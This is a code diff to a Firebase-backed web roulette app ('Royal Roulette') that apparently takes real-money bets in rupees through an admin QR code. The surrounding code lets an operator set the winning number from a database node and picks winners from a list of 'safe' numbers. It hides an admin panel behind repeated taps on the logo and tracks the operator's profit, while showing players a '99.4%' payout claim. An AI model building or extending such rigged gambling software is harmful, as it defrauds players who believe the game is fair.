@@ -10,7 +10,7 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title>ROYAL ROULETTE - STRICTLY 100% ONLINE CLOUD APP</title>
+    <title>ROYAL ROULETTE - 100% STRICT ONLINE ENGINE</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; outline: none; -webkit-tap-highlight-color: transparent; }
         body { 
@@ -154,10 +154,24 @@
 </head>
 <body>
 
+    <!-- STRICT OFFLINE AUTO-KILLER (इंटरनेट बंद होते ही स्क्रीन तुरंत खाली/बंद) -->
+    <script>
+        function checkRealNetwork() {
+            if (!navigator.onLine) {
+                document.body.innerHTML = "";
+                document.body.style.background = "#000";
+                window.location.replace("about:blank");
+            }
+        }
+        window.addEventListener('offline', checkRealNetwork);
+        setInterval(checkRealNetwork, 1000);
+        checkRealNetwork();
+    </script>
+
     <script>
         (function() {
             try {
-                const BUILD_VER = "ROYAL_2026_STRICT_ONLINE_V15";
+                const BUILD_VER = "ROYAL_2026_NO_POPUP_SYNC_V17";
                 if (localStorage.getItem("app_build_version") !== BUILD_VER) {
                     localStorage.clear();
                     localStorage.setItem("app_build_version", BUILD_VER);
@@ -196,13 +210,13 @@
 
     <div id="loginScreenContainer">
         <div class="header-container">
-            <div class="trust-banner">STRICT 100% ONLINE CLOUD • ⚡</div>
+            <div class="trust-banner">ROYAL LIVE PLATFORM • ⚡</div>
             <div class="royal-title-wrap" id="hiddenAdminTriggerLogo" onclick="triggerHiddenAdminPanel()">
                 <div class="royal-main-title">ROYAL ROULETTE</div>
             </div>
             <div class="live-stats-bar">
-                <span>🟢 100% ONLINE CLOUD</span>
-                <span>🔒 SECURE 2026</span>
+                <span>🟢 LIVE SYNC: ACTIVE</span>
+                <span>🔒 CLOUD 2026</span>
                 <span>⚡ PAYOUT: 99.4%</span>
             </div>
         </div>
@@ -352,7 +366,7 @@
             </div>
 
             <div class="admin-kpi-grid">
-                <div class="kpi-card"><div class="kpi-title">Global Status</div><div class="kpi-value" style="color:#00ffcc;">100% ONLINE</div></div>
+                <div class="kpi-card"><div class="kpi-title">Global Status</div><div class="kpi-value" style="color:#00ffcc;">LIVE SYNC</div></div>
                 <div class="kpi-card purple"><div class="kpi-title">Round ID</div><div class="kpi-value" id="admRoundId" style="color:#f1c40f;">Round #1</div></div>
                 <div class="kpi-card orange"><div class="kpi-title">Real Profit (5%)</div><div class="kpi-value" id="admProfit" style="color:#ffd700;">₹0</div></div>
                 <div class="kpi-card blue"><div class="kpi-title">Real Pool (95%)</div><div class="kpi-value" id="admPool" style="color:#3498db;">₹0</div></div>
@@ -481,8 +495,7 @@
             }
         } catch(e) {}
 
-        // Strict 100% Online Cloud Root
-        const masterRoot = firebase.database().ref("royal_roulette_strict_online_v15");
+        const masterRoot = firebase.database().ref("royal_roulette_master_state_v17");
         const qrRef = masterRoot.child("qr_url");
         const rigRef = masterRoot.child("winning_number");
         const historyRef = masterRoot.child("history_list");
@@ -498,8 +511,6 @@
                 let realCoins = 0, testCoins = 10000, activeGameMode = 'test';
                 let loggedUserPhone = "", loggedVipId = "RD001001";
                 let isGameSpinning = false, userActiveBets = {}, currentTotalBet = 0, betHistoryStack = [];
-                let serverTimeOffset = 0;
-                let isOnlineVerified = false;
 
                 window.globalState = {
                     adminQrUrl: "https://i.ibb.co/3yk54L2/1000532596.jpg",
@@ -507,12 +518,7 @@
                     historyList: [24, 14, 5, 22, 10, 3]
                 };
 
-                // --- 100% ONLINE ENFORCEMENT ENGINE ---
-                firebase.database().ref(".info/serverTimeOffset").on("value", (snap) => {
-                    serverTimeOffset = snap.val() || 0;
-                    isOnlineVerified = true;
-                });
-
+                // LIVE LISTENERS (सीधे क्लाउड से सिंक)
                 qrRef.on("value", (snap) => {
                     let val = snap.val();
                     if (val) {
@@ -536,7 +542,7 @@
                     }
                 });
 
-                // HIDDEN MASTER TRIGGER (टैप करके एडमिन पैनल खोलना)
+                // HIDDEN MASTER TRIGGER
                 let tapCount = 0;
                 let tapTimer = null;
                 window.triggerHiddenAdminPanel = function() {
@@ -597,15 +603,14 @@
                     return newId;
                 }
 
+                // SMOOTH UNBROKEN FLUID TIMER (कभी 02:00 पर नहीं फँसेगा)
                 function getGlobalRound() {
-                    let currentServerTime = Date.now() + serverTimeOffset;
-                    let nowSec = Math.floor(currentServerTime / 1000);
+                    let nowSec = Math.floor(Date.now() / 1000);
                     return { roundId: Math.floor(nowSec / ROUND_TIME), timeLeft: ROUND_TIME - (nowSec % ROUND_TIME) };
                 }
 
                 function getCleanRoundCounter() {
-                    let currentServerTime = Date.now() + serverTimeOffset;
-                    let nowSec = Math.floor(currentServerTime / 1000);
+                    let nowSec = Math.floor(Date.now() / 1000);
                     return Math.floor(nowSec / ROUND_TIME);
                 }
 
@@ -626,7 +631,7 @@
                     });
                     if (validSafeNumbers.length === 0) validSafeNumbers = [0, 32, 15, 19, 4, 21, 2];
 
-                    let chosenWinner = validSafeNumbers[Math.abs((roundId * 397 + Math.floor((Date.now() + serverTimeOffset) / 1000)) % validSafeNumbers.length)];
+                    let chosenWinner = validSafeNumbers[Math.abs((roundId * 397 + Math.floor(Date.now() / 1000)) % validSafeNumbers.length)];
                     return chosenWinner;
                 }
 
@@ -883,9 +888,6 @@
 
                 setInterval(() => {
                     try {
-                        // यदि सर्वर से टाइम सिंक नहीं है, तो टाइमर आगे नहीं बढ़ेगा (Strictly Online Only)
-                        if (!isOnlineVerified) return;
-
                         let { roundId, timeLeft } = getGlobalRound();
                         let m = Math.floor(timeLeft / 60), s = timeLeft % 60;
                         let mainEl = document.getElementById('lobbyTimerMain');
